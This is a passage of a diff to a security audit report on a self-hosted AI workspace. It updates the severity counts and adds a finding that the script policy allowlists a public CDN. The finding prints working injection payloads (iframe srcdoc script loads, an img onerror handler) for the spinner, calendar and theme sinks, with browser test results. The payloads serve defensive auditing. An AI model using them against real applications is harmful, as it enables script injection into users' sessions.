@@ -5,7 +5,7 @@
 | **Audit date** | 2026-10-03 |
 | **Snapshot** | `2992bf6d368a` of https://github.com/odysseus-dev/odysseus |
 | **Run** | `odysseus/2026-10-03T2340` |
-| **Findings** | 399 — 3 high, 106 medium, 290 low |
+| **Findings** | 400 — 5 high, 105 medium, 290 low |
 | **Scope** | Self-hosted AI workspace: a FastAPI backend and a large first-party front end covering chat, an agent loop with a tool surface, email, calendar, documents and RAG, memory, research, model serving, and MCP. Python 3.11+ with a stdlib-plus-FastAPI backend. |
 | **Language** | python |
 | **Method** | Static analysis at the snapshot. Every cited line was re-read there. Claims that a command could settle were run, and the result is recorded with the finding. Anything that could not be run says so. |
@@ -89,32 +89,33 @@ A finding may also carry an `**Issue:**` field naming the public issue that trac
 
 # Executive summary
 
-**2026-10-04 — all 58 sections reviewed.** The run holds 399 findings: three high, 106 medium and
-290 low.
+**2026-10-05 — all 58 sections reviewed; two re-review passes done.**
 
-Five patterns account for most of the medium findings in the 35 backend sections (126,017 lines).
-Three more run through the 23 non-backend sections: written material that describes a different
-program, escaping that does not fit its context, and tests that pin a copy of the code rather than
-the code.
+The run holds five high-severity defects. Three are in the Python backend and two are script
+execution in the browser. Eight patterns account for most of the medium findings.
 
 - **[Findings at a glance](#findings-at-a-glance)** holds the generated counts and the full medium
-  list, so it is current even where this summary is not.
+  list.
 
 ## Fix first
 
 | Finding | What happens | Fix |
 | --- | --- | --- |
 | [`manage_research` ignores the owner](#security-manage_research-ignores-the-owner-and-operates-on-every-users-research-files) | Any user who can use agent mode lists, reads and deletes every user's research reports. No privilege disables the tool. | Filter the scan by the owner recorded in each file, as the HTTP route for the same files does. |
-| [The Codex and Claude email send never delivers](#bug-the-codex-and-claude-email-send-endpoint-reports-the-message-queued-and-never-delivers-it) | The endpoint answers `{"success": true, "queued": true}` and drops the message. Every send through the documented integration is lost without an error. | Pass the injected `BackgroundTasks` object through to the send handler. |
-| [Concurrent memory writes lose entries](#race-concurrent-memory-writes-lose-entries-raise-filenotfounderror-and-can-leave-memoryjson-unreadable) | Two concurrent writers lost an entry in 43 of 50 bursts. Twelve writers left `memory.json` unparsable once in 30 bursts. | Lock the read-modify-write and stage through a unique temp file. The bundled memory MCP server writes the same file from a second process, so a process-local lock is not enough. |
+| [The Codex and Claude email send never delivers](#bug-the-codex-and-claude-email-send-endpoint-reports-the-message-queued-and-never-delivers-it) | The endpoint answers `{"success": true, "queued": true}` and drops the message. | Pass the injected `BackgroundTasks` object through to the send handler. |
+| [Concurrent memory writes lose entries](#race-concurrent-memory-writes-lose-entries-raise-filenotfounderror-and-can-leave-memoryjson-unreadable) | Two concurrent writers lost an entry in 43 of 50 bursts, measured under a forced switch interval. Twelve writers left `memory.json` unparsable once in 30 bursts. | Lock the read-modify-write and stage through a unique temp file. The memory MCP server writes the same file from a second process, so a process-local lock is not enough. |
+| [A search-result title runs script in the app](#security-a-hostile-search-result-title-reaches-the-research-spinners-innerhtml-injecting-markup-into-the-app-origin) | During Deep Research, a page title is assigned to `innerHTML`. A title carrying a `srcdoc` frame loaded a CDN script in the app's origin. Whether a live search provider returns such a title unmodified was not tested. | Write the spinner message as text. |
+| [A calendar event's location runs script in the app](#security-a-calendar-events-location-is-only-partly-escaped-so-a-synced-or-imported-event-injects-html-and-css-into-the-calendar-ui) | A synced or imported event whose location starts with a URL has the rest of the text parsed as HTML. The same frame technique ran a CDN script when the event was opened. | Escape the whole string, then linkify the escaped copy. |
 
-## Patterns across the backend
+The last two depend on [the script policy allowlisting a public CDN](#security-script-src-allowlists-cdnjsdelivrnet-so-injected-markup-runs-attacker-hosted-script-through-a-srcdoc-frame).
+Removing `cdn.jsdelivr.net` from `script-src` closes that route for every markup sink in the run;
+the sinks still need fixing.
 
-Each pattern names its cause, the findings that belong to it, and the shared fix where one exists.
+## Patterns in the backend
 
 ### Owner identity is resolved handler by handler
 
-Six handlers take the caller's identity and do not apply it, or apply the pseudo-user that every
+Handlers take the caller's identity and do not apply it, or apply the pseudo-user that every
 bearer token shares. One user's action then reads, rewrites or deletes another user's records.
 
 **Shared fix:** one helper that returns the storage owner, called by tools, routes and scheduled
@@ -124,147 +125,108 @@ actions.
 - [Bearer callers share preferences, drafts and signatures](#security-bearer-callers-share-the-same-preferences-editor-drafts-and-signatures-across-token-owners)
 - [Bearer callers share one comparison owner](#security-bearer-callers-share-one-comparison-owner-and-can-read-and-delete-each-others-records)
 - [The session list deletes every owner's incognito rows](#security-the-session-list-deletes-every-owners-incognito-rows-not-just-the-callers)
-- [`classify_events` uses one user's memories on every user's calendar](#bug-classify_events-classifies-every-users-calendar-events-with-one-users-memories)
 - [`daily_brief` reads the default mailbox](#bug-daily_brief-reads-the-default-mailbox-instead-of-the-task-owners)
-
-Two more findings are missing gates, not missing owner filters:
-[memory edit, pin, delete and audit skip the memory-management privilege](#security-memory-pin-edit-delete-and-audit-bypass-the-memory-management-privilege),
-and
-[the hardware-fit routes let a non-admin run SSH probes against a host the caller chooses](#security-hardware-fit-routes-let-non-admins-run-server-side-ssh-probes-against-caller-selected-hosts).
 
 ### `async def` handlers make synchronous calls
 
-A blocking IMAP, CardDAV, HTTP or model call inside an `async def` handler holds the event loop,
-so every other request waits until it returns.
+A blocking IMAP, CardDAV, HTTP or model call inside an `async def` handler holds the event loop.
+The app runs one worker, so every other request waits.
 
 **Shared fix:** declare the handler `def`, or wrap the call in `asyncio.to_thread`.
 
 - [Nineteen email handlers](#perf-nineteen-async-def-handlers-run-blocking-imap-smtp-or-http-io-on-the-event-loop)
-- [The chat path: model, web-search and URL-fetch calls](#perf-the-chat-path-runs-synchronous-llm-web-search-and-url-fetch-calls-on-the-event-loop)
-- [Context-length discovery, once per local request](#perf-context-length-discovery-runs-two-synchronous-http-probes-on-the-event-loop-once-per-local-request)
-- [PDF and image processing in the gallery and document routes](#perf-pdf-and-image-processing-runs-synchronously-inside-the-async-handlers)
-- [CardDAV requests in the contact handlers](#perf-carddav-requests-run-synchronously-inside-async-contact-handlers)
-- [Speech, upload processing and vision analysis](#perf-speech-upload-processing-and-vision-analysis-run-blocking-work-on-the-request-event-loop)
-- [Both search POST handlers](#perf-both-search-post-handlers-execute-synchronous-network-work-on-the-event-loop)
-- [`list_models` endpoint probes](#perf-list_models-probes-endpoints-with-synchronous-http-on-the-event-loop)
+- [The chat path](#perf-the-chat-path-runs-synchronous-llm-web-search-and-url-fetch-calls-on-the-event-loop)
+- [Context-length discovery](#perf-context-length-discovery-runs-two-synchronous-http-probes-on-the-event-loop-once-per-local-request)
+- [CardDAV requests](#perf-carddav-requests-run-synchronously-inside-async-contact-handlers)
 
 ### Features report success and do nothing
 
-These fail without an error, so neither the user nor a test that checks the status code sees them.
+These fail without an error, so neither the user nor a status-code test sees them.
 
-**Shared fix:** for the agent tools, one pass that compares each tool's schema against the tool
-registry and the routes it calls. The others need their own fixes.
+**Shared fix for the agent tools:** compare each tool's schema against the tool registry and the
+routes it calls.
 
 - [The Codex and Claude email send](#bug-the-codex-and-claude-email-send-endpoint-reports-the-message-queued-and-never-delivers-it) (high)
 - [`edit_image` calls four routes that do not exist](#bug-edit_image-calls-four-routes-that-do-not-exist)
 - [`manage_tokens` mints tokens the middleware cannot authenticate](#bug-manage_tokens-mints-tokens-the-middleware-cannot-authenticate)
-- [`tail_serve_output` is rejected on every native call](#bug-tail_serve_output-is-advertised-to-native-models-but-missing-from-tool_tags-so-every-native-call-is-rejected)
-- [`manage_research` has no native schema](#bug-manage_research-has-no-native-schema-so-the-report-read-path-the-prompt-and-rag-steer-to-is-unreachable-for-native-models)
 - [The email-urgency triage never reaches its classifier](#bug-the-email-urgency-triage-never-reaches-its-llm-classifier-and-still-requires-an-llm-endpoint)
 - [The scheduled-send poller starts only after an inbox request](#bug-the-scheduled-send-poller-starts-only-when-a-client-asks-for-the-inbox-list)
 
 ### State and secret files are written without a lock, an atomic replace, or a mode
 
-The app keeps memories, preferences, background jobs and credentials in JSON files, and writes the
-app key, `.env`, the setup password database and the cookbook runner scripts beside them. Writers
-truncate in place or share one temp path, and secret-bearing files land at the umask default — a
-backup archive carries the app key beside the database it decrypts, the "stolen backup" case
-`src/secret_storage.py` names as its threat model.
+Memories, preferences, jobs and credentials live in JSON files. Writers truncate in place or share
+one temp path, and secret-bearing files land at the umask default.
 
-**Shared fix:** route every write through one helper that locks, stages to a unique temp file,
-replaces atomically and sets the mode, and apply the same to the members a restore writes.
+**Shared fix:** one write helper that locks, stages to a unique temp file, replaces atomically and
+sets the mode.
 
 - [Concurrent memory writes lose entries](#race-concurrent-memory-writes-lose-entries-raise-filenotfounderror-and-can-leave-memoryjson-unreadable) (high)
 - [The hourly null-owner sweep rewrites two stores non-atomically](#bug-the-hourly-null-owner-sweep-rewrites-memoryjson-and-user_prefsjson-non-atomically)
-- [The background-job store has no writer lock](#race-a-killed-background-job-can-still-be-auto-continued-the-job-store-has-no-writer-lock)
 - [`atomic_write_json` leaves the auth and settings stores at the umask default](#security-atomic_write_json-leaves-the-auth-and-settings-stores-at-the-umask-default)
-- [`snapshot` writes the archive world-readable, beside the key it contains](#security-snapshot-writes-the-archive-world-readable-beside-the-key-it-contains)
-- [`restore` does not restore file modes](#security-restore-does-not-restore-file-modes-so-the-app-key-comes-back-world-readable)
-- [The HuggingFace token is written in cleartext to world-readable runner scripts](#security-the-huggingface-token-is-written-in-cleartext-to-world-readable-runner-scripts-that-the-serve-path-never-removes)
-- [First-run setup writes the password database and `.env` world-readable](#footgun-first-run-setup-writes-the-password-database-and-the-env-file-world-readable)
+- [`snapshot` writes the archive world-readable](#security-snapshot-writes-the-archive-world-readable-beside-the-key-it-contains)
 
 ### Failures are returned as normal results
 
-A truncated, failed or partial operation is handed back as if it had completed. The cost is lost
-or missing data that nothing reports.
+A truncated, failed or partial operation is handed back as if it had completed.
 
 - [A cut-off model stream is reported as a complete answer](#error-handling-a-stream-that-ends-without-done-or-is-cut-off-at-the-token-limit-is-reported-as-a-complete-answer)
 - [Compaction drops messages it never summarized](#bug-compaction-rewrites-the-wrong-slice-of-the-session-history-dropping-messages-it-never-summarized)
 - [A failing vector collection is reported as an empty, healthy one](#error-handling-a-collection-that-fails-is-reported-as-an-empty-healthy-lane-so-retrieval-returns-nothing-with-no-diagnostic)
-- [A duplicate event UID discards a calendar's whole pull](#bug-a-vevent-uid-that-another-calendar-already-holds-discards-that-calendars-whole-pull-while-the-counts-still-report-it-as-synced)
-- [The research library omits saved partial reports](#bug-the-research-library-silently-drops-saved-partial-reports-with-null-statistics)
 
-## Outside the backend
+## Patterns outside the backend
 
-No non-backend section holds a high-severity finding, so the fix-first table stands. Three patterns
-run through these 23 sections.
+### Untrusted text is written into markup
 
-### The written material describes a different program than the code
+Client code writes a page title, a calendar location, a theme name, a model id and a task prompt
+into `innerHTML`. The first pass rated these as markup injection because the script policy has no
+`'unsafe-inline'`. The re-review on 2026-10-05 measured script execution at three of them, raised
+two to high, and added the policy finding.
 
-27 of the run's 30 `DOC-DRIFT` findings are here — 11 in the 61 specification files, 7 in the root
-documents, 9 across the website, build and companion files — against 3 in the 35 backend sections.
+**Shared fix:** escape at the sink for the context written into, and remove the CDN from
+`script-src`.
+
+- [The script policy allowlists a public CDN](#security-script-src-allowlists-cdnjsdelivrnet-so-injected-markup-runs-attacker-hosted-script-through-a-srcdoc-frame)
+- [A stored theme name is rendered as markup on every page load](#security-a-stored-custom-theme-name-is-rendered-into-the-theme-grid-as-markup-on-every-page-load)
+- [A sender's display name escapes its attribute](#security-a-senders-display-name-and-attachment-filename-escape-their-attribute-because-_esc-is-used-where-an-attribute-escaper-is-needed)
+- [The email sanitizer keeps remote URLs in styles and `poster`](#security-the-email-html-sanitizer-keeps-remote-urls-in-inline-styles-and-poster-so-an-html-mail-beacons-without-the-users-consent)
+
+The theme name needs a `ui_control` call, which the tool gate blocks after untrusted content unless
+the user approves. The last two are attribute and CSS injection and do not reach script.
+
+### The written material describes a different program
+
+32 of the run's 35 `DOC-DRIFT` findings are outside the backend: in the specifications, the root
+documents and the website.
 
 **Shared fix:** one pass over `specs/`, the root documents and `website/` that re-derives each claim
-from the code at the reviewed commit, security-relevant claims first.
+from the code, security claims first.
 
-- [26 of the 61 specs are stamped with a baseline commit that does not exist in this repository](#doc-drift-26-of-the-61-specs-are-stamped-with-a-baseline-commit-that-does-not-exist-in-this-repository)
-- [The threat model does not state multi-user data isolation as a goal](#doc-drift-the-threat-model-does-not-state-multi-user-data-isolation-as-a-goal-while-the-code-enforces-owner-scoping-and-this-audit-found-that-enforcement-failing)
-- [`SECURITY.md`'s fork-publishing scan returns two dozen false positives on the repository it ships with](#doc-drift-securitymds-fork-publishing-scan-returns-two-dozen-false-positives-on-the-repository-it-ships-with)
-- [The pairing credential is described as one-time but is a permanent, replayable bearer token](#doc-drift-the-pairing-credential-is-described-as-one-time-but-is-a-permanent-replayable-bearer-token)
-- [`shell-mcp.md` describes `ShellService` as "safe command execution" with "output caps"](#doc-drift-shell-mcpmd-describes-shellservice-as-safe-command-execution-with-output-caps)
+- [26 of the 61 specs name a baseline commit that does not exist](#doc-drift-26-of-the-61-specs-are-stamped-with-a-baseline-commit-that-does-not-exist-in-this-repository)
+- [The threat model does not state multi-user isolation as a goal](#doc-drift-the-threat-model-does-not-state-multi-user-data-isolation-as-a-goal-while-the-code-enforces-owner-scoping-and-this-audit-found-that-enforcement-failing)
+- [`ACKNOWLEDGMENTS.md` describes the core as permissive after the AGPL relicense](#doc-drift-acknowledgmentsmd-still-describes-the-shipped-core-as-permissive-four-months-after-the-project-relicensed-to-agpl-30)
 
-### Escaping does not fit its context
+### Tests pin a copy of the code
 
-Seven client-side sinks interpolate untrusted text into markup: a web page's `<title>` into the
-research spinner, a model-authored theme name into the theme grid and the slash replies, MCP tool
-metadata and calendar locations into quoted attributes, an email's `style` and `poster` URLs into
-CSS. Two files use the right escaper one context too early — `_esc` is a `textContent` round-trip,
-so it does not escape a quote inside an attribute.
+The recurring defect in the 8 test sections is a test that checks a source substring, a hand-written
+copy, or a stub in place of the guard. It passes when the behaviour it names is removed.
 
-**The policy, not the code, keeps this short of script execution.** The chat page carries
-`script-src 'self' 'nonce-…'` with no `'unsafe-inline'` (`core/middleware.py:141-147`), so injected
-handlers are refused; the report page is served with `'unsafe-inline'` (`:115-123`), where the same
-injection executes.
+**Shared fix:** drive the real call path.
 
-**Shared fix:** escape at the sink, in the context it is written into, and treat a relaxed policy
-anywhere as turning every one of these into an execution bug.
-
-- [A hostile search-result title reaches the research spinner's `innerHTML`](#security-a-hostile-search-result-title-reaches-the-research-spinners-innerhtml-injecting-markup-into-the-app-origin)
-- [A stored custom-theme name is rendered into the theme grid as markup on every page load](#security-a-stored-custom-theme-name-is-rendered-into-the-theme-grid-as-markup-on-every-page-load)
-- [The MCP tool list shadows the quote-escaping `esc` with a weaker local one](#security-the-mcp-tool-list-shadows-the-quote-escaping-esc-with-a-weaker-local-one-so-tool-metadata-injects-markup)
-- [A calendar event's location is only partly escaped](#security-a-calendar-events-location-is-only-partly-escaped-so-a-synced-or-imported-event-injects-html-and-css-into-the-calendar-ui)
-- [A sender's display name and attachment filename escape their attribute](#security-a-senders-display-name-and-attachment-filename-escape-their-attribute-because-_esc-is-used-where-an-attribute-escaper-is-needed)
-- [The email HTML sanitizer keeps remote URLs in inline styles and `poster`](#security-the-email-html-sanitizer-keeps-remote-urls-in-inline-styles-and-poster-so-an-html-mail-beacons-without-the-users-consent)
-
-### The tests pin a copy of the code, so they pass when it changes
-
-The recurring defect in the 8 tests sections is a test that reproduces the logic it is meant to
-check — a source substring, a hand-written copy of the module, or a stub that replaces the very
-guard under test. Such a file stays green when the behaviour it names is removed, which is why
-several of these findings were proved by making the module unimportable and watching the file pass.
-
-**Shared fix:** drive the real call path. Where a unit is hard to reach, say so in the test rather
-than testing a transcription of it.
-
-- [Four source-text "pins" pass with the code they name made unimportable](#bug-four-source-text-pins-pass-with-the-code-they-name-made-unimportable)
-- [Every CalDAV test-connection test runs with the URL guard stubbed out](#security-every-caldav-test-connection-test-runs-with-the-url-guard-stubbed-out) — neutering the real guard leaves the suite green while the guard's own suite collapses to 17 failures
+- [Four source-text pins pass with the code made unimportable](#bug-four-source-text-pins-pass-with-the-code-they-name-made-unimportable)
+- [Every CalDAV test-connection test stubs the URL guard](#security-every-caldav-test-connection-test-runs-with-the-url-guard-stubbed-out)
 - [The `web_search` sources tests assert on a copy of the fix](#bug-the-web_search-sources-tests-in-test_agent_looppy-assert-on-a-copy-of-the-fix-so-reverting-the-fix-leaves-the-suite-green)
-- [The Cookbook source-text guards pass against a file with no implementation](#bug-the-cookbook-source-text-guards-pass-against-a-file-with-no-implementation)
-- [`conftest.py`'s pre-import block makes the module-scope stub guards dead in 23 files](#doc-drift-conftestpys-pre-import-block-makes-the-module-scope-stub-guards-for-the-modules-it-pre-imports-dead-in-23-files)
-- [`test_chat_route_tool_policy.py`'s functional half re-implements the tool policy](#bug-test_chat_route_tool_policypys-functional-half-re-implements-the-tool-policy-and-passes-with-routeschat_routes-unimportable)
+- [`test_chat_route_tool_policy.py` re-implements the tool policy](#bug-test_chat_route_tool_policypys-functional-half-re-implements-the-tool-policy-and-passes-with-routeschat_routes-unimportable)
 
-## What this pass does not establish
+## What this run does not establish
 
-- **The test sections sampled rather than read the suite.** `tests-rest` read 47 of its 322 files
-  end to end and did not open 267; `tests-llm-tools` read 46 of 121; `tests-cookbook-models` read 59
-  of 112. Each states its sample and method, so the tests findings are the shape of what a sample
-  turns up, not a count of the suite.
+- **The test sections sampled.** `tests-rest` read 47 of its 322 files end to end, `tests-llm-tools`
+  46 of 121, and `tests-cookbook-models` 59 of 112.
 - **No build or deployment was run.** Measurements are the probes each finding quotes.
-- **Most findings carry first-pass evidence only.** The
-  [re-review on 2026-10-04](#re-review-2026-10-04) re-derived the 26 findings then rated high or
-  medium, confirmed all 26 and lowered 10 severities. Nothing found since has been re-reviewed.
-- **A finding count is a floor.** It is set by what was read. A file this pass did not read has not
-  been checked.
+- **Most lows carry first-pass evidence only.** The two re-reviews re-derived every high and every
+  `fix-now` finding and opened every medium. For the 290 lows, a script checked the quoted code and
+  cited locations against the source, and 11 were read. See
+  [Re-review, 2026-10-05](#re-review-2026-10-05).
+- **A finding count is a floor.** A file this run did not read has not been checked.
 
 Suspected defects that did not survive checking are under
 [Hypotheses tested and rejected](#hypotheses-tested-and-rejected).
@@ -390,7 +352,7 @@ The repository has no Makefile or package script, so its gates are the GitHub Ac
 | [Build, install, launcher, CI and containers](#2-build-install-launcher-ci-and-containers) | 11 | 0 | 1 | 10 |
 | [Specifications](#3-specifications) | 11 | 0 | 0 | 11 |
 | [Operational scripts](#4-operational-scripts) | 24 | 0 | 8 | 16 |
-| [core: auth, sessions, middleware, models](#5-core-auth-sessions-middleware-models) | 5 | 0 | 1 | 4 |
+| [core: auth, sessions, middleware, models](#5-core-auth-sessions-middleware-models) | 6 | 0 | 2 | 4 |
 | [core: database, atomic IO, constants, platform](#6-core-database-atomic-io-constants-platform) | 6 | 0 | 3 | 3 |
 | [src: agent loop, runs, approvals and gates](#7-src-agent-loop-runs-approvals-and-gates) | 7 | 0 | 2 | 5 |
 | [src: LLM interaction, endpoints, model capability](#8-src-llm-interaction-endpoints-model-capability) | 7 | 0 | 3 | 4 |
@@ -427,8 +389,8 @@ The repository has no Makefile or package script, so its gates are the GitHub Ac
 | [services: shell, STT, TTS, faces, youtube](#39-services-shell-stt-tts-faces-youtube) | 7 | 0 | 2 | 5 |
 | [static: image editor](#40-static-image-editor) | 9 | 0 | 3 | 6 |
 | [static: model comparison UI](#41-static-model-comparison-ui) | 7 | 0 | 1 | 6 |
-| [static: chat, sessions and composer UI](#42-static-chat-sessions-and-composer-ui) | 8 | 0 | 2 | 6 |
-| [static: documents, notes, email, calendar UI](#43-static-documents-notes-email-calendar-ui) | 8 | 0 | 3 | 5 |
+| [static: chat, sessions and composer UI](#42-static-chat-sessions-and-composer-ui) | 8 | 1 | 1 | 6 |
+| [static: documents, notes, email, calendar UI](#43-static-documents-notes-email-calendar-ui) | 8 | 1 | 2 | 5 |
 | [static: cookbook, settings, models UI](#44-static-cookbook-settings-models-ui) | 5 | 0 | 0 | 5 |
 | [static: research, memory and search UI](#45-static-research-memory-and-search-ui) | 11 | 0 | 1 | 10 |
 | [static: remaining first-party JS](#46-static-remaining-first-party-js) | 5 | 0 | 1 | 4 |
@@ -444,14 +406,14 @@ The repository has no Makefile or package script, so its gates are the GitHub Ac
 | [tests: session, chat, memory and RAG](#56-tests-session-chat-memory-and-rag) | 10 | 0 | 3 | 7 |
 | [tests: documents, uploads, gallery and media](#57-tests-documents-uploads-gallery-and-media) | 7 | 0 | 1 | 6 |
 | [tests: remaining test modules](#58-tests-remaining-test-modules) | 9 | 0 | 2 | 7 |
-| **Total** | **399** | **3** | **106** | **290** |
+| **Total** | **400** | **5** | **105** | **290** |
 
 ### Findings by disposition
 
 | Disposition | Findings | High | Medium | Low |
 | --- | ---: | ---: | ---: | ---: |
-| `fix-now` | 8 | 2 | 5 | 1 |
-| `next` | 305 | 1 | 101 | 203 |
+| `fix-now` | 11 | 4 | 6 | 1 |
+| `next` | 303 | 1 | 99 | 203 |
 | `backlog` | 86 | 0 | 0 | 86 |
 
 ### Findings by tag
@@ -459,7 +421,7 @@ The repository has no Makefile or package script, so its gates are the GitHub Ac
 | Tag | Count |
 | --- | ---: |
 | `BUG` | 155 |
-| `SECURITY` | 55 |
+| `SECURITY` | 56 |
 | `DOC-DRIFT` | 35 |
 | `ERROR-HANDLING` | 35 |
 | `PERF` | 35 |
@@ -474,14 +436,17 @@ The repository has no Makefile or package script, so its gates are the GitHub Ac
 
 ### Act on first
 
-Every high-severity finding (3) and every `fix-now` finding, 9 in all.
+Every high-severity finding (5) and every `fix-now` finding, 12 in all.
 
 | Severity | Finding | Location |
 | --- | --- | --- |
 | high | [`manage_research` ignores the owner and operates on every user's research files](#security-manage_research-ignores-the-owner-and-operates-on-every-users-research-files) | `src/tools/research.py:17` |
 | high | [Concurrent memory writes lose entries, raise `FileNotFoundError`, and can leave `memory.json` unreadable](#race-concurrent-memory-writes-lose-entries-raise-filenotfounderror-and-can-leave-memoryjson-unreadable) | `src/memory.py:275-278 (the shared temp path), with :180-186 and :261-274` |
 | high | [The Codex and Claude email-send endpoint reports the message queued and never delivers it](#bug-the-codex-and-claude-email-send-endpoint-reports-the-message-queued-and-never-delivers-it) | `routes/codex_routes.py:387 (with routes/email_routes.py:4519, :4708, :4714, :4717, and routes/email_helpers.py:2004)` |
+| high | [A hostile search-result title reaches the research spinner's `innerHTML`, injecting markup into the app origin](#security-a-hostile-search-result-title-reaches-the-research-spinners-innerhtml-injecting-markup-into-the-app-origin) | `static/js/chat.js:3153 and :6068 (the message), static/js/chat.js:2042 and` |
+| high | [A calendar event's location is only partly escaped, so a synced or imported event injects HTML and CSS into the calendar UI](#security-a-calendar-events-location-is-only-partly-escaped-so-a-synced-or-imported-event-injects-html-and-css-into-the-calendar-ui) | `static/js/calendar.js:3437-3449 (the URL branch at :3439-3444; sinks at` |
 | medium | [`ACKNOWLEDGMENTS.md` still describes the shipped core as permissive, four months after the project relicensed to AGPL-3.0](#doc-drift-acknowledgmentsmd-still-describes-the-shipped-core-as-permissive-four-months-after-the-project-relicensed-to-agpl-30) | `ACKNOWLEDGMENTS.md:149 (with :151, :160, :166)` |
+| medium | [`script-src` allowlists `cdn.jsdelivr.net`, so injected markup runs attacker-hosted script through a `srcdoc` frame](#security-script-src-allowlists-cdnjsdelivrnet-so-injected-markup-runs-attacker-hosted-script-through-a-srcdoc-frame) | `core/middleware.py:143` |
 | medium | [A layer's adjustment cache is keyed only by the adjustment stack, so strokes and pixel edits on that layer never render](#bug-a-layers-adjustment-cache-is-keyed-only-by-the-adjustment-stack-so-strokes-and-pixel-edits-on-that-layer-never-render) | `static/js/editor/fx/pixel-pass.js:225` |
 | medium | [Rotate, flip and upscale do not transform mask sub-layers, and rotate/upscale clear the active mask](#bug-rotate-flip-and-upscale-do-not-transform-mask-sub-layers-and-rotateupscale-clear-the-active-mask) | `static/js/editor/canvas-transforms.js:84` |
 | medium | [The editor keydown handler is registered again on every open, so one Ctrl+Z undoes N steps](#bug-the-editor-keydown-handler-is-registered-again-on-every-open-so-one-ctrlz-undoes-n-steps) | `static/js/editor/keyboard-shortcuts.js:68` |
@@ -490,7 +455,7 @@ Every high-severity finding (3) and every `fix-now` finding, 9 in all.
 
 ### Medium severity
 
-101 findings: wrong behaviour under identifiable conditions, or a mechanism that does not deliver what it claims. In section order.
+99 findings: wrong behaviour under identifiable conditions, or a mechanism that does not deliver what it claims. In section order.
 
 | Finding | Disposition | Location |
 | --- | --- | --- |
@@ -565,9 +530,7 @@ Every high-severity finding (3) and every `fix-now` finding, 9 in all.
 | [A YouTube-shaped URL with no extractable video id is dropped from both the transcript path and the web-fetch path](#bug-a-youtube-shaped-url-with-no-extractable-video-id-is-dropped-from-both-the-transcript-path-and-the-web-fetch-path) | next | `services/youtube/youtube_handler.py:61 (with :78 and the two callers, src/chat_handler.py:149-152 and src/chat_processor.py:461)` |
 | [The comment fetch shells out to `yt-dlp`, which no requirement file or image installs](#dependency-the-comment-fetch-shells-out-to-yt-dlp-which-no-requirement-file-or-image-installs) | next | `services/youtube/youtube_handler.py:217 (with _find_ytdlp at :39-45 and the failure branch at :274-276)` |
 | [Switching the composer to Chat or Agent after a search-mode comparison leaves every pane unable to stream](#bug-switching-the-composer-to-chat-or-agent-after-a-search-mode-comparison-leaves-every-pane-unable-to-stream) | next | `static/js/compare/index.js:262-267 (search mode builds no sessions),` |
-| [A hostile search-result title reaches the research spinner's `innerHTML`, injecting markup into the app origin](#security-a-hostile-search-result-title-reaches-the-research-spinners-innerhtml-injecting-markup-into-the-app-origin) | next | `static/js/chat.js:3153 and :6068 (the message), static/js/chat.js:2042 and` |
 | [Custom theme names are stored from the model's `ui_control` call and rendered unescaped into slash replies](#security-custom-theme-names-are-stored-from-the-models-ui_control-call-and-rendered-unescaped-into-slash-replies) | next | `static/js/slashCommands.js:1468-1470 and :1498-1500 (customNames.join(', ')` |
-| [A calendar event's location is only partly escaped, so a synced or imported event injects HTML and CSS into the calendar UI](#security-a-calendar-events-location-is-only-partly-escaped-so-a-synced-or-imported-event-injects-html-and-css-into-the-calendar-ui) | next | `static/js/calendar.js:3437-3449 (the URL branch at :3439-3444; sinks at` |
 | [A sender's display name and attachment filename escape their attribute, because `_esc` is used where an attribute escaper is needed](#security-a-senders-display-name-and-attachment-filename-escape-their-attribute-because-_esc-is-used-where-an-attribute-escaper-is-needed) | next | `static/js/emailLibrary.js:699 (_recipientChipHtml; also :6821,` |
 | [The email HTML sanitizer keeps remote URLs in inline styles and `poster`, so an HTML mail beacons without the user's consent](#security-the-email-html-sanitizer-keeps-remote-urls-in-inline-styles-and-poster-so-an-html-mail-beacons-without-the-users-consent) | next | `static/js/emailLibrary/utils.js:184-188 (the attribute and CSS lists) with the` |
 | [The research panel and its job queue are each evaluated twice, so two panel instances share one set of DOM ids](#bug-the-research-panel-and-its-job-queue-are-each-evaluated-twice-so-two-panel-instances-share-one-set-of-dom-ids) | next | `static/js/research/panel.js:4` |
@@ -3335,6 +3298,62 @@ scheme-less endpoint URL after `build_chat_url` (finding 4); plus caller greps f
   a three-call sequence the method hides.
 - **Fix:** delete the method, or make it fail closed for 2FA users
   (`if self.totp_enabled(username): return None`) and name it for what it does.
+
+#### [SECURITY] `script-src` allowlists `cdn.jsdelivr.net`, so injected markup runs attacker-hosted script through a `srcdoc` frame
+
+- **Location:** `core/middleware.py:143`
+- **Severity:** medium
+- **Disposition:** fix-now
+- **Evidence:** the policy for every app page lets scripts load from a public CDN:
+
+  ```python
+  # core/middleware.py:141-144
+  response.headers["Content-Security-Policy"] = (
+      "default-src 'self'; "
+      f"script-src 'self' 'nonce-{nonce}' https://cdn.jsdelivr.net; "
+  ```
+
+  `cdn.jsdelivr.net` serves any file from any public npm package or GitHub repository
+  (`/npm/<package>@<version>/<file>`, `/gh/<user>/<repo>@<ref>/<file>`), so the allowlist admits
+  script an attacker publishes. A `<script>` element assigned through `innerHTML` does not run, and
+  an inline handler is refused for lack of `'unsafe-inline'`. An `<iframe srcdoc>` assigned through
+  `innerHTML` does load: its document inherits the parent's policy and origin, its `<script src>` is
+  parser-inserted, and the source matches the allowlist. `frame-src 'self'` does not stop it.
+
+  Measured on 2026-10-05 in headless Chromium, on a page served with the policy string above (nonce
+  fixed for the probe), with the real CDN and three shipped sinks:
+
+  | Sink | Input | Result |
+  | --- | --- | --- |
+  | `static/js/spinner.js`, imported unmodified and driven as `chat.js:2042` and `:3153` drive it | title `<iframe srcdoc="<script src=https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js></script>">` | `cdn script ran in frame; lodash 4.17.21; frame origin http://127.0.0.1:9101` |
+  | The same spinner | title `<img src=x onerror="document.title=1">` | `no execution` |
+  | `_locHTML`, `static/js/calendar.js:3437-3449`, copied by line range | location `https://maps.example.test/room5 <iframe srcdoc="<script src=https&colon;//cdn.jsdelivr.net/…></script>">` | `cdn script ran; lodash 4.17.21`, same origin as the page |
+  | The swatch template, `static/js/theme.js:660-671`, copied by line range | theme name `<iframe/srcdoc="<script/src=https://cdn.jsdelivr.net/…></script>">`, as `src/ai_interaction.py:759` leaves it | `cdn script ran; lodash 4.17.21`, same origin as the page |
+
+  The frame's origin equals the page's, so its script reaches `parent`. A control with a stand-in
+  allowlisted origin serving `parent.document.title='PWNED'` changed the parent's title. lodash
+  stands in for an attacker's file; no attacker-controlled package was published for the probe.
+- **Impact:** the policy does not stop script execution for any sink that parses attacker text as
